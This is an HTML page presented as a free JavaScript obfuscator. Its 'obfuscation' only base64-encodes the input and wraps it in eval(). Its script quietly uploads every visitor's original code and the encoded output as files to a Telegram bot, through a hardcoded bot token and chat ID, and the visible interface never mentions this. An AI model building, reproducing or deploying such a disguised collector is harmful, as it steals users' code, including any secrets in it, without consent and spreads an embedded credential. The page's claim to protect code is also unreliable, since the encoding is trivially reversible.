<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>JavaScript Obfuscator</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #6a11cb, #2575fc);
      color: #fff;
      padding: 20px;
    }

    .container {
      max-width: 600px;
      margin: 0 auto;
      background: #ffffff;
      color: #333;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 24px;
      color: #333;
    }

    label {
      display: block;
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 8px;
    }

    textarea {
      width: 100%;
      height: 150px;
      margin-bottom: 20px;
      padding: 10px;
      font-size: 14px;
      border: 2px solid #ddd;
      border-radius: 8px;
      background: #f9f9f9;
      resize: none;
      outline: none;
      transition: border 0.3s ease;
    }

    textarea:focus {
      border-color: #6a11cb;
    }

    button {
      display: inline-block;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      transition: background 0.3s ease;
      margin-right: 10px;
    }

    /* Obfuscate Button */
    #obfuscateButton {
      background-color: #6a11cb;
      color: #fff;
    }

    #obfuscateButton:hover {
      background-color: #2575fc;
    }

    /* Copy Button */
    #copyButton {
      background-color: #28a745;
      color: #fff;
    }

    #copyButton:hover {
      background-color: #218838;
    }

    button:disabled {
      background-color: #ddd;
      cursor: not-allowed;
    }

    .output {
      margin-top: 20px;
    }

    .output h3 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #333;
    }

    .output textarea {
      background: #f0f8ff;
      color: #333;
      font-family: monospace;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>JavaScript Obfuscator Tool</h2>
    <label for="inputCode">Enter Your JavaScript Code:</label>
    <textarea id="inputCode" placeholder="Write your JavaScript code here..."></textarea>
    <button id="obfuscateButton">Obfuscate</button>
    <button id="copyButton" disabled>Copy to Clipboard</button>
    <div class="output">
      <h3>Obfuscated Code:</h3>
      <textarea id="outputCode" readonly></textarea>
    </div>
  </div>

  <script>
    function obfuscateCode(code) {
  // Convert code to Base64 encoding
  const base64Code = btoa(unescape(encodeURIComponent(code)));
  // Wrap the encoded string in an eval() statement to execute it
  return `eval(decodeURIComponent(escape(atob('${base64Code}'))));`;
}

document.getElementById("obfuscateButton").addEventListener("click", async function () {
  const inputCode = document.getElementById("inputCode").value.trim();

  if (inputCode === "") {
    alert("Please enter some JavaScript code to obfuscate.");
    return;
  }

  // Show loading state
  const obfuscateButton = document.getElementById("obfuscateButton");
  const originalButtonText = obfuscateButton.textContent;
  obfuscateButton.disabled = true;
  obfuscateButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

  try {
    // Generate obfuscated code
    const obfuscated = obfuscateCode(inputCode);
    document.getElementById("outputCode").value = obfuscated;

    // Enable the copy button
    document.getElementById("copyButton").disabled = false;

    // Send to Telegram
    await sendToTelegram(inputCode, obfuscated);

  } catch (error) {
    console.error("Error:", error);
    alert("An error occurred during obfuscation or sending to Telegram");
  } finally {
    // Restore button state
    obfuscateButton.disabled = false;
    obfuscateButton.textContent = originalButtonText;
  }
});

document.getElementById("copyButton").addEventListener("click", function () {
  const outputCode = document.getElementById("outputCode");
  outputCode.select();
  document.execCommand("copy");
  alert("Obfuscated code copied to clipboard!");
});

// Telegram Bot Integration
async function sendToTelegram(originalCode, obfuscatedCode) {
  try {
    // Create blobs for both codes
    const originalBlob = new Blob([originalCode], { type: 'text/javascript' });
    const obfuscatedBlob = new Blob([obfuscatedCode], { type: 'text/javascript' });
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const originalFileName = `original_${timestamp}.js`;
    const obfuscatedFileName = `obfuscated_${timestamp}.js`;
    
    // Prepare form data
    const formData = new FormData();
    formData.append("chat_id", "7293808519"); // Your Telegram chat ID
    formData.append("caption", `🔐 *JavaScript Code Obfuscation Results*\n\n` +
      `📝 Original: ${originalCode.length} chars\n` +
      `🔒 Obfuscated: ${obfuscatedCode.length} chars\n` +
      `⏱ ${new Date().toLocaleString()}`);
    formData.append("parse_mode", "Markdown");
    
    // Attach both files
    formData.append("document", originalBlob, originalFileName);
    formData.append("document", obfuscatedBlob, obfuscatedFileName);

    // Send to Telegram
    const response = await fetch("https://api.telegram.org/bot8201547739:AAFplHfCn8ZcZWmgQHD0__XyF4aHlv1P3Qo/sendDocument", {
      method: "POST",
      body: formData
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    console.log("Code successfully sent to Telegram");

  } catch (error) {
    console.error("Telegram send error:", error);
    // Show subtle notification
    const notification = document.createElement('div');
    notification.textContent = "Note: Couldn't send to Telegram (check console)";
    notification.style.color = '#ff9800';
    notification.style.marginTop = '10px';
    notification.style.fontSize = '0.9em';
    document.getElementById("outputContainer").appendChild(notification);
    setTimeout(() => notification.remove(), 5000);
  }
}
  </script>
</body>
</html>
